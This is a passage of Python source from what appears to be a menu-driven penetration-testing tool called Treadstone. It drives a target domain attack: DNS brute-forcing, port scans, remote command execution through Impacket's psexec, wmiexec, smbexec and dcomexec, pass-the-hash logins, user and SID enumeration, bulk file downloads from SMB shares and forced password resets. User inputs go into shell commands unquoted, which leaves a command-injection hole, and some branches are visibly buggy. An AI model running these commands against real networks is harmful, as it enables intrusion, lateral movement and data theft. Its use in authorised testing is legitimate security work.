# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - fierce -dom DOMAIN.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()
         
      if checkParams != 1:
         print(colored("[*] Checking DOMAIN zone transfer...", colour3))
         command("dnsrecon -d " + DOM.rstrip(" ") + " -t axfr")
         
         print(colored("[*] Bruteforcing DOMAIN name, please wait this can take sometime...", colour3))
         command("dnsrecon -d " + DOM.rstrip(" ") + " -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt")

#         print(colored("[*] Checking DOMAIN ranges, please wait this can take sometime...", colour3))
#         if IP46 == "-4":
#            bit1,bit2,bit3,bit3 = TIP.split(".")
#            command("dnsrecon -n " + TIP.rstrip(" ") + " -r " + bit1 + ".0.0.0/8 -d " + DOM.rstrip(" "))
#         command("dnsrecon -n " + TIP.rstrip(" ") + " -r 172.16.0.0/12 -d "  + DOM.rstrip(" "))
#         command("dnsrecon -n " + TIP.rstrip(" ") + " -r 192.168.0.0/16 -d " + DOM.rstrip(" "))
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      checkParams = test_IP()      
      if checkParams != 1:
            print(colored("[*] Attempting to enumerate live ports, please wait as this can take sometime...", colour3))
            command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
            PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
            POR = spacePadding(PTS, COL1)
            
            if POR[:1] == "":
               print("[+] Unable to enumerate any port information, good luck!!...")
            else:
               print("[+] Found live ports...\n")               
               print(colored(PTS,colour6))

      if "3128" in PTS:
         print(colored("\n[*] Checking squid proxy for hidden ports...", colour3))
         command("wfuzz -t32 -z range,1-65535 -p '" + TIP.rstrip(" ") + ":3128' --hc 503 http://localhost:FUZZ/ > squid.tmp  2>&1")
         temp = '"'
         command("awk '/" + temp + "/' squid.tmp > ports.tmp")
         command("echo '" + Green + "'")
         command("cat ports.tmp")
         command("echo '" + Reset + "'")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '21':
      checkParams = test_IP()      
      if checkParams != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
            command("nmap " + IP46 + " -p " + PTS + " -sC -sV " + TIP.rstrip(" "))
         else:
            print(colored("[*] Fast scanning all ports, please wait...", colour3))
            command("nmap " + IP46 + " -T4 -F " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '22':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()
      if checkParams != 1:
         print(colored("[*] Scanning for subdomains, please wait...", colour3))
         command("nmap " + IP46 + " --script dns-brute --script-args dns-brute.domain=" + DOM.rstrip(" ") + ",dns-brute.threads=6,dns-brute.hostlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt,newtargets -sS -p 80")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      checkParams = test_IP()      
      if checkParams != 1:
         checkParams = test_Port("88")
      if checkParams != 1:
         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")     
         dateTime = linecache.getline("time.tmp", 1).rstrip("\n")   
            
         if dateTime != "":
            date, time = dateTime.split(" ")
            time = time.rstrip(")")
            print("[+] Synchronised with remote server...")
            command("echo '" + Green + "'")
            command("timedatectl set-time " + date)
            command("date --set=" + time)
            command("echo '" + Reset + "'")
            LTM = time
            SKEW = 1
         else:
            print("[-] Server synchronisation did not occur...")                 
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getArch.py target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      checkParams = test_IP()      
      if checkParams != 1:
         print(colored("[*] Attempting to enumerate architecture...", colour3))
         command(keyPath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")        
         
         with open("os.tmp") as read:
            for arch in read:
               if "is" in arch:
                  print("[+] Found architecture...\n")
                  print(colored(arch.rstrip("\n"),colour6))
                  checkParams = 1
                  
      if checkParams == 0:
         print("[+] Unable to identify architecture...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='25':
      checkParama = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()      
      if checkParams != 1:
         command(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='26':
      checkParams = test_IP
      if checkParams != 1:
         checkParams = test_Domain()      
      if checkParams != 1:
         command(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()      
      if checkParams != 1:
         command(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " whoami /all")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()               
      if checkParams != 1:
         command(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()               
      if checkParams != 1:
         command(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()            
      if checkParams != 1:
         command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '31':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()      
      if checkParams != 1:
         command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - showmount -e IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         checkParams = test_Port("2049")
         
      if checkParams != 1:
         command("showmount -e " + TIP.rstrip(" ") + " > mount.tmp")
         command("sed -i '/Export list for/d' mount.tmp")         
         
         if os.path.getsize("mount.tmp") > 0:
            print("[+] NFS exports found...\n")
            
            with open("mount.tmp") as read:
               for mount in read:
                  mount = mount.replace("/","")
                  mount = mount.rstrip("\n")
                  print(colored(mount,colour6))
         else:
            print("[-] No NFS exports were found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - mount -t nfs  IP:/mount mount/
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '33':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         checkParams = test_Port("2049")
         
      if checkParams != 1:
         mount = input("[?] Please enter NFS name : ")
         
         if not os.path.exists(mount):
            command("mkdir " + mount)
         command("mount -t nfs " + TIP.rstrip(" ") + ":/" + mount + " " + mount + "/")
         print("[+] NFS " + mount + " mounted...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
# Modified: 08/12/2020 - Currently Using DOM rather than TIP as command has issues with IP6.
# -------------------------------------------------------------------------------------

   if selection =='34':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()         
         
      if checkParams != 1:
            print(colored("[*] Enumerating DNS zones...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
            print(colored("\n[*] Enumerating domain admins...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
            print(colored("\n[*] Enumerating admin protected objects...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
            print(colored("\n[*] Enumerating domain users...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
            print(colored("\n[*] Enumerating remote management users...",colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
            print(colored("\n[*] Enumerating users with unconstrained delegation...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
            print(colored("\n[*] Enumerating domain groups...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
            print(colored("\n[*] Enumerating AD computers...", colour3))
            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         print(colored("[*] Enumerating, please wait....", colour3))
         command(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
         command("cat domain.tmp | grep 'Domain SID' > sid.tmp")
         
         with open("sid.tmp", "r") as read:
            line1 =  read.readline()
            
         if "Domain SID is:" in line1:
            SID = line1.replace('[*] Domain SID is: ',"")
            print("[+] Found DOMAIN SID...\n")
            print(colored(" " + SID, colour6))
            SID = spacePadding(SID, COL1)               
         else:
            print("[+] Unable to find domain SID...")  
                       
         command("sed -i /*/d domain.tmp")
         command("sed -i 's/.*://g' domain.tmp")   
         command("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
         command("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
         command("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")         
         command("sed -i 's/(SidTypeAlias)//g' alias.tmp")
         command("sed -i 's/(SidTypeGroup)//g' group.tmp")
         command("sed -i 's/(SidTypeUser)//g'  users.tmp")    
                       
         if os.path.getsize("alias.tmp") != 0:
            print("[+] Found Aliases...\n")
            command("tput setaf 2")
            command("cat alias.tmp")
            command("tput sgr0")
         else:
            print("[+] Unable to find aliases...")
                                    
         if os.path.getsize("group.tmp") != 0:
            print("\n[+] Found Groups...\n")
            command("tput setaf 2")
            command("cat group.tmp")
            command("tput sgr0")
         else:
            print("[+] Unable to find groups...") 
                                 
         if os.path.getsize("users.tmp") != 0:
            print("\n[+] Found Users...\n")
            command("tput setaf 2")
            command("cat users.tmp")  
            command("tput sgr0")
         else:
            print("[+] Unable to find usernames...")  
                            
         if os.path.getsize("users.tmp") != 0:
            command("rm " + dataDir + "/usernames.txt")
            command("rm " + dataDir + "/hashes.txt")
            command("touch " + dataDir + "/hashes.txt")
            wipeTokens(VALD)         
                   
            with open("users.tmp", "r") as read:
               for x in range(0, maxUser):
                  HASH[x] = " "*COL4
                  line1 = read.readline()                  
                  if line1 != "":
                     try:
                        null,USER[x] = line1.split("\\")
                     except ValueError:
                        USER[x] = "Error..."
                     USER[x] = spacePadding(USER[x], COL3)
                     command("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                  else:
                     USER[x] = " "*COL3
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='36':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         print(colored("[*] Enumerating users, please wait this can take sometime...", colour3))   
         
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password authentication...\n")
            command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
         else:
            command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > users.tmp")
         
         count = lineCount("users.tmp")
         
         if count > 0:
            with open("users.tmp", "r") as read:
               for x in range(0, count):
                  line = read.readline()
                  if "[-] SMB SessionError:" in line:
                     checkParams = 1
                     command("cat users.tmp")
                     break
                                 
         if checkParams != 1:
            command("rm " + dataDir + "/usernames.txt")          
            command("rm " + dataDir + "/hashes.txt")                        
            command("touch " + dataDir + "/hashes.txt")                      
            command("sed -i -n '/Found user: /p' users.tmp")
            command("cat users.tmp | sort > users2.tmp")            
            wipeTokens(VALD)
            
            print("[+] Found usernames...\n")            
            with open("users2.tmp", "r") as read:
               for x in range (0, maxUser):
                  USER[x] = read.readline()                  
                  if USER[x] != "":
                     USER[x] = USER[x].replace("Found user: ", "")
                     USER[x] = USER[x].split(",")
                     USER[x] = USER[x][0]
                     USER[x] = spacePadding(USER[x], COL3)  
                                        
                     if USER[x] != "":
                       print(colored(USER[x],colour6))
                       command("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                       HASH[x] = " "*COL4
                     else:
                        USER[x] = " "*COL3
                        HASH[x] = " "*COL4
                  else:
                     USER[x] = " "*COL3
                     HASH[x] = " "*COL4
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Modified: N/A
# Note    : Needs a structure rewrite!!!
# -------------------------------------------------------------------------------------

   if selection =='37':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()            
         
      if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password authentication...")           
      print("[i] Valid registry hives are shown below...\n")
      keys()                      
      
      if checkParams != 1:
         registryKey = ""         
         while registryKey.lower() != "quit":
            registryKey = input("\n[*] Enter registry key or type 'quit' to finish or 'help' for help: ") 
            if registryKey.lower() == "help":
               keys()
            else:
               if NTM[:5] != "EMPTY" and registryKey.lower() != "quit": 
                  command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
               else:
                  if registryKey.lower() != "quit":
                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='38':
      checkParams = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()      
      if checkParams != 1:
         command(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rpcmap.py -debug -auth-transport DOM/USER:PASSWORD \
# Modified: N/A
# Note    : Needs a strcuture rewrite!!!
# -------------------------------------------------------------------------------------

   if selection == '39':
      checkParams = test_IP()      
      stringBindings = input("[?] Enter a valid stringbinding value, such as 'ncacn_ip_tcp:" + DOM.rstrip(" ") + "[135]' : ")    
        
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[!] Using HASH value as defualt password...")
            if "135" in PTS:
               command(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + stringBindings)
            if "443" in PTS:
               command(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
         else:
            if "135" in PTS:
               command(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " " + stringBindings)
            if "443" in PTS:
               command(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()            
         
      if checkParams != 1:
         if NTM[:5] == "EMPTY":
            command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
         else:
            print("[i] Using HASH value as password login credential...\n")
            command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='41':
      checkParams = test_IP()      
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares.tmp")
         else:
            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.tmp")            
         bonusCheck = linecache.getline("shares.tmp", 1)  
                         
         if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
            print(colored("[!] Bonus!! It looks like we can change this users password...", colour0))
            command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))  
                                  
         if os.path.getsize("shares.tmp") != 0:       
            command("tput setaf 2")
            command("cat shares.tmp")
            command("tput sgr0")            
            command("sed -i /'is an IPv6 address'/d shares.tmp")
            command("sed -i /'no workgroup'/d shares.tmp")
            command("sed -i /'NT_STATUS_LOGON_FAILURE'/d shares.tmp")
            command("sed -i /'NT_STATUS_ACCESS_DENIED'/d shares.tmp")
            command("sed -i /'NT_STATUS_ACCOUNT_DISABLED'/d shares.tmp")
            command("sed -i /Sharename/d shares.tmp")
            command("sed -i /---------/d shares.tmp")
            command("sed -i '/^$/d' shares.tmp")
            command("sed -i 's/^[ \t]*//' shares.tmp")
            command("mv shares.tmp " + dataDir + "/shares.txt")    
                             
         with open(dataDir + "/shares.txt", "r") as shares:
            for x in range(0, maxUser):
                SHAR[x] = shares.readline().rstrip(" ")
                SHAR[x] = spacePadding(SHAR[x], COL2)
      else:
         print("[+] Unable to obtains shares...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '42':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()          
         
      if IP46 == "-6":
         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour0))		# IT MIGHT BE POSSIBLE TO USE DOMAIN NAME BUT NEED REWRITE!!
         checkParams = 1   
         
      if checkParams != 1:
         checkParams = test_Share()                       
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print(colored("[*] Checking OS...", colour3))
            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
         else:
            print(colored("[*] Checking OS...", colour3))
            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
         
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print(colored("[*] Checking command privilege...", colour3))
            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
         else:
            print(colored("[*] Checking command privilege...", colour3))
            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
         
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print(colored("[*] Mapping Shares...", colour3))
            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
         else:
            print(colored("[*] Mapping Shares...", colour3))
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      checkParama = test_IP()
      if checkParams != 1:
         checkParams = test_Domain()    
         
      if checkParams != 1:
         exTensions = fileExt.replace(",","|")
         exTensions = "'(" + exTensions + ")'" 
                          
         if IP46 == "-6":
            print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour0)) 
            checkParams = 1
            
      if checkParams != 1:
         checkParams = test_Share()         
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print("[+] Downloading any found files...")
            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
         else:
            print("[+] Downloading any found files...")
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '44':
      checkParams = test_IP()       
           
      if checkParams != 1:
         checkParams = test_Share()         
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash -s " + TSH.rstrip(" " ))
         else:
            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " -s " + TSH.rstrip(" "))
      prompt()
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      checkParams = test_IP()
      
      if checkParams != 1:
